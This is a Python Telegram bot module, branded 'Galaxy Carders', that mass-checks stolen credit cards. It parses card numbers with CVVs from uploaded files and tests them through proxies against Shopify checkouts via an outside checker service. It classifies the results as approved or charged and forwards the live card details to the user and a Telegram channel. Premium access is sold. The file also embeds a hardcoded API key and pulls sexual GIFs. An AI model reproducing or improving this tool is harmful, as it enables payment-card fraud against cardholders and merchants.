import os
import re
import csv
import json
import time
import random
import threading
import requests
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

MAX_CARDS = 1000
BATCH_SIZE = 5
stop_flags = {}
CARD_REGEX = re.compile(r"(\d{12,19})\D(\d{1,2})\D(\d{2,4})\D(\d{3,4})")

STELLER_CHANNEL_ID = "-1002797778636"  # 🔁 Replace with your channel username or numeric ID

APPROVE_LIST = ["INSUFFICIENT_FUNDS", "INCORRECT_CVC", "INCORRECT_ZIP", "Thank You", "THANK YOU"]
DECLINE_LIST = [
    "GENERIC_ERROR", "AUTHORIZATION_ERROR", "CARD_DECLINED", "EXPIRED_CARD",
    "CARD TOKEN IS EMPTY", "DECLINED", "PROCESSING_ERROR", "FRAUD_SUSPECTED", "INVALID_TOKEN", "tax ammount empty", "3D_AUTHENTICATION", "INCORRECT_NUMBER"
]
BLACKLIST_RESPONSES = [
    "INVALID URL", "HANDLE IS EMPTY", "RECEIPT ID IS EMPTY",
    "HCAPTCHA DETECTED", "AMOUNT_TOO_SMALL", "Clinte Token", "py id empty", "r4 token empty"
]

currently_checking = set()

def is_premium(user_id):
    try:
        with open("id.txt", "r") as f:
            for line in f:
                if ":" in line:
                    uid, expiry = line.strip().split(":")
                    if str(user_id) == uid and float(expiry) > time.time():
                        return True
    except:
        pass
    return False

def lookup_bin(bin_):
    try:
        with open("ranges.csv", "r") as csvfile:
            reader = csv.DictReader(csvfile)
            for row in reader:
                if row["bin"] == bin_:
                    return {
                        "brand": row.get("vendor", "UNKNOWN").upper(),
                        "type": row.get("type", "UNKNOWN").upper(),
                        "level": row.get("level", "UNKNOWN").upper(),
                        "bank": row.get("bank", "UNKNOWN").title(),
                        "country_flag": row.get("country_code", "XX").upper()
                    }
    except:
        pass

    try:
        r = requests.get(f"https://lookup.binlist.net/{bin_}", timeout=10)
        data = r.json()
        return {
            "brand": data.get("scheme", "UNKNOWN").upper(),
            "type": data.get("type", "UNKNOWN").upper(),
            "level": data.get("brand", "UNKNOWN").upper(),
            "bank": data.get("bank", {}).get("name", "UNKNOWN").title(),
            "country_flag": data.get("country", {}).get("emoji", "🏳️")
        }
    except:
        return {
            "brand": "UNKNOWN", "type": "UNKNOWN", "level": "UNKNOWN",
            "bank": "UNKNOWN", "country_flag": "🏳️"
        }

def remove_site(uid, site):
    try:
        with open("sites.json", "r+") as f:
            data = json.load(f)
            if uid in data and site in data[uid]:
                data[uid].remove(site)
                f.seek(0)
                f.truncate()
                json.dump(data, f, indent=2)
    except Exception as e:
        print("❌ Error removing site:", e)

def get_random_anime_gif():
    try:
        key = "AIzaSyCWoNQD3d-3fxkPBr09ouunc_hPrfByKt8"
        url = f"https://tenor.googleapis.com/v2/search?q=anime boobs&key={key}&limit=50"
        res = requests.get(url)
        return random.choice(res.json()["results"])["media_formats"]["gif"]["url"]
    except:
        return None

def mask_proxy(proxy):
    if "@" in proxy:
        creds, host = proxy.split("@", 1)
        user = creds.split(":")[0]
        return f"{user}@{host}"
    elif proxy.count(":") == 3:
        parts = proxy.split(":")
        if len(parts) == 4:
            host, port, user, _ = parts
            return f"{user}@{host}:{port}"
    return proxy

def load_sites(uid):
    try:
        with open("sites.json", "r") as f:
            return json.load(f).get(str(uid).strip(), [])
    except:
        return []

def save_sites(uid, sites):
    try:
        with open("sites.json", "r") as f:
            data = json.load(f)
    except:
        data = {}
    data[str(uid).strip()] = sites
    with open("sites.json", "w") as f:
        json.dump(data, f, indent=2)

def load_proxy(uid):
    try:
        with open("proxies.json", "r") as f:
            return json.load(f).get(str(uid).strip())
    except:
        return None

def parse_cards_from_text(text):
    return ["|".join(match.groups()) for line in text.strip().split('\n') if (match := CARD_REGEX.search(line))]

def parse_cards_from_file(file_path):
    with open(file_path, 'r') as f:
        return parse_cards_from_text(f.read())

def register_shtxt_handler(bot):
    @bot.message_handler(commands=['shtxt'])
    def shtxt_handler(message):
        uid = str(message.chat.id)

        if uid in currently_checking:
            return bot.reply_to(message, "⚠️ <b><i>Checking already in progress.</i></b>\nPlease wait for it to finish or stop it manually.", parse_mode="HTML")

        currently_checking.add(uid)

        if not is_premium(uid):
            return bot.reply_to(message, "<b><i>🚫 Premium Access Required</i></b>\n<pre>Ask @Galaxy_Carders for a redeem code.</pre>", parse_mode="HTML")

        sites = load_sites(uid)
        proxy = load_proxy(uid)

        if not sites:
            currently_checking.discard(uid)
            return bot.reply_to(message, "❌ No Shopify sites found. Use /murl first.")
        if not proxy:
            currently_checking.discard(uid)
            return bot.reply_to(message, "❌ No proxy found. Use /addproxy first.")

        file_info = None
        if message.reply_to_message and message.reply_to_message.document:
            file_info = message.reply_to_message.document
        elif message.document:
            file_info = message.document

        if not file_info:
            currently_checking.discard(uid)
            return bot.reply_to(message, "❌ Please send or reply to a .txt file containing cards.")

        file_path = f"temp/{uid}_cards.txt"
        os.makedirs("temp", exist_ok=True)
        downloaded_file = bot.download_file(bot.get_file(file_info.file_id).file_path)
        with open(file_path, 'wb') as f:
            f.write(downloaded_file)

        cards = parse_cards_from_file(file_path)
        if not cards:
            currently_checking.discard(uid)
            return bot.reply_to(message, "❌ No valid cards found in file.")
        if len(cards) > MAX_CARDS:
            currently_checking.discard(uid)
            return bot.reply_to(message, f"❌ Max {MAX_CARDS} cards allowed.")

        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🛑 Stop Checking", callback_data=f"stop_{uid}"))
        msg = bot.reply_to(message, "⏳ <b>Starting check...</b>", parse_mode="HTML", reply_markup=markup)

        approved_count = 0
        declined_count = 0
        charged_count = 0

        def check_card(card, site, index, total, msg_id, bot, message, uid, proxy, sites, cards, markup):
            nonlocal approved_count, declined_count, charged_count
            if stop_flags.get(uid): return
            try:
                url = f"https://autoshopify-dark.sevalla.app/index.php?site={site}&cc={card}&proxy={proxy}"
                r = requests.get(url, timeout=25)
                try:
                    data = r.json()
                except:
                    data = {"cc": card, "Response": r.text or "Unknown", "Status": False}
                cc = data.get("cc", card)
                resp = str(data.get("Response", "Unknown"))
                status_raw = data.get("Status", False)
                status = (str(status_raw).strip().lower() in ("true", "1", "ok", "success"))
                gateway = str(data.get("Gateway", "N/A"))
                price = str(data.get("Price", "0"))
                bin_info = lookup_bin(cc[:6])
                brand = bin_info["brand"]
                type_ = bin_info["type"]
                level = bin_info["level"]
                bank = bin_info["bank"]
                country_flag = bin_info["country_flag"]
            except Exception as e:
                if "Read timed out" in str(e) or "Connection aborted" in str(e):
                    cards.insert(index + 1, card)
                    return
                cc = card
                resp = "Unknown"
                status = False
                gateway = "N/A"
                price = "0"
                brand = type_ = level = bank = "UNKNOWN"
                country_flag = "🏳️"

            if any(x in resp.upper() for x in APPROVE_LIST):
                approved_count += 1
                send_card(bot, message, cc, resp, gateway, proxy, brand, type_, level, bank, country_flag, price)
            if "Thank You" in resp.upper() or "ORDER_PLACED" in resp.upper():
                charged_count += 1
                send_card(bot, message, cc, resp, gateway, proxy, brand, type_, level, bank, country_flag, price)
            if any(x in resp.upper() for x in DECLINE_LIST):
                declined_count += 1
            if any(bad.lower() in resp.lower() for bad in BLACKLIST_RESPONSES) or not status:
                try:
                    sites.remove(site)
                    save_sites(uid, sites)
                    msgx = bot.reply_to(message, f"🚫 <b>Site removed:</b> <code>{site}</code>\nReason: {resp}", parse_mode="HTML")
                    time.sleep(5)
                    bot.delete_message(message.chat.id, msgx.message_id)
                except: pass
                return

            bot.edit_message_text(f"""
╔═══════════════════════╗
   ✦  <b>𝓒𝓐𝓡𝓓 𝓒𝓗𝓔𝓒𝓚𝓘𝓝𝓖</b> ✦
╚═══════════════════════╝
🔢 <b>Checked:</b> <code>{index + 1} / {total}</code>
💳 <b>Card:</b> <code>{cc}</code>
🛒 <b>Site:</b> <code>{site}</code>
📬 <b>Response:</b> <code>{resp}</code>
━━━━━━━━━━━━━━━━━━━━━
✅ <b>Approved:</b> <code>{approved_count}</code>   
❌ <b>Declined:</b> <code>{declined_count}</code>   
💰 <b>Charged:</b> <code>{charged_count}</code>
━━━━━━━━━━━━━━━━━━━━━
<b>Galaxy Carders:</b> <a href="https://t.me/Galaxyhubb">Join Now 🔗</a>
""", message.chat.id, msg_id, parse_mode="HTML", reply_markup=markup)

        def process_cards():
            stop_flags[uid] = False
            total = len(cards)
            pointer = 0
            index = 0
            while pointer < len(cards) and not stop_flags.get(uid):
                threads = []
                for i in range(min(BATCH_SIZE, len(sites))):
                    if pointer >= len(cards): break
                    site = sites[i % len(sites)]
                    card = cards[pointer]
                    t = threading.Thread(target=check_card, args=(
                        card, site, index, total, msg.message_id, bot, message, uid, proxy, sites, cards, markup
                    ))
                    t.start()
                    threads.append(t)
                    pointer += 1
                    index += 1
                    time.sleep(0.2)
                for t in threads:
                    t.join()
            stop_flags.pop(uid, None)
            currently_checking.discard(uid)
            bot.edit_message_text(f"""
╔═══════════════════════╗
   ✅ <b>𝓒𝓗𝓔𝓒𝓚𝓘𝓝𝓖 𝓒𝓞𝓜𝓟𝓛𝓔𝓣𝓔</b> ✅
╚═══════════════════════╝
🗂️ <b>Total Cards:</b> <code>{total}</code>
✅ <b>Approved:</b> <code>{approved_count}</code>
❌ <b>Declined:</b> <code>{declined_count}</code>
💳 <b>Charged:</b> <code>{charged_count}</code>
━━━━━━━━━━━━━━━━━━━━━
<b>Powered By:</b> <a href="https://t.me/Galaxyhubb">Galaxy Carders™ 🔗</a>
""", message.chat.id, msg.message_id, parse_mode="HTML")

        threading.Thread(target=process_cards).start()

    @bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
    def stop_check(call):
        uid = call.data.split("_")[1]
        stop_flags[uid] = True
        currently_checking.discard(uid)
        try:
            bot.edit_message_text("🛑 <b>Stopped by user.</b>", call.message.chat.id, call.message.message_id, parse_mode="HTML")
        except:
            pass
        bot.answer_callback_query(call.id, "✅ Stopped.")

def send_card(bot, message, card, status_text, gateway, proxy, brand, type_, level, bank, country_flag, price):
    gif_url = get_random_anime_gif()
    
    # ✅ Status title: Charged or Approved
    if (
    "CHARGED" in status_text.upper()
    or status_text.upper().startswith("THANK YOU")
    or "ORDER_PLACED" in status_text.upper()
):
        status_title = "𝗖𝗛𝗔𝗥𝗚𝗘𝗗 💎"
    else:
        status_title = "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅"

    receipt = "https://XHamster.com/Galaxy_Carders/checkouts/cn/hWN2kTvZIuxBQbKQTjlrxSsd/en-us/processing?completed=true&reload_receipt=false&skip_shop_pay=true"
    bin_lookup_url = f"https://binlist.io/lookup/{card[:6]}"

    text = f"""
<b><i>{status_title}</i></b>
━━━━━━━━━━━━━━━━━━
<b><i>𝗖𝗮𝗿𝗱:</i></b> <code>{card}</code>
<b><i>𝗦𝘁𝗮𝘁𝘂𝘀:</i></b> <code>{status_text}</code>
<b><i>𝗚𝗮𝘁𝗲𝘄𝗮𝘆:</i></b> <code>${price} {gateway}</code>
<b><i>𝗥𝗲𝗰𝗲𝗶𝗽𝘁:</i></b> <a href='{receipt}'>🔗 <b><i>View Receipt</i></b></a>
━━━━━━━━━━━━━━━━━
<b><i>𝗜𝗻𝗳𝗼:</i></b> <a href="{bin_lookup_url}">🔍 <b><i>Click for BIN Lookup</i></b></a>
<b><i>╟ 𝗖𝗮𝗿𝗱 𝗧𝘆𝗽𝗲:</i></b> {brand} - {type_} - {level}
<b><i>╟ 𝗕𝗮𝗻𝗸:</i></b> {bank}
<b><i>╟ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆:</i></b> {country_flag}
━━━━━━━━━━━━━━━━━━
<b><i>𝗣𝗿𝗼𝘅𝘆:</i></b> <code>{mask_proxy(proxy)}</code>
━━━━━━━━━━━━━━━━━━
"""

    # 🧩 Buttons for user and channel
    buttons = InlineKeyboardMarkup()
    buttons.row(
        InlineKeyboardButton("👤 𝗢𝘄𝗻𝗲𝗿", url="https://t.me/Gaalxy_Carders"),
        InlineKeyboardButton("🌌 𝗚𝗮𝗹𝗮𝘅𝘆 𝗛𝘂𝗯", url="https://t.me/GalaxyHubb")
    )

    # 👤 Send to USER
    if gif_url:
        bot.send_animation(
            chat_id=message.chat.id,
            animation=gif_url,
            caption=text,
            parse_mode="HTML",
            reply_markup=buttons,
            reply_to_message_id=message.message_id
        )
    else:
        bot.send_message(
            chat_id=message.chat.id,
            text=text,
            parse_mode="HTML",
            reply_markup=buttons,
            reply_to_message_id=message.message_id
        )

    # 📢 Send to CHANNEL
    try:
        if gif_url:
            bot.send_animation(
                chat_id=STELLER_CHANNEL_ID,
                animation=gif_url,
                caption=text,
                parse_mode="HTML",
                reply_markup=buttons
            )
        else:
            bot.send_message(
                chat_id=STELLER_CHANNEL_ID,
                text=text,
                parse_mode="HTML",
                reply_markup=buttons
            )
    except Exception as e:
        print(f"❌ Failed to send to channel: {e}")
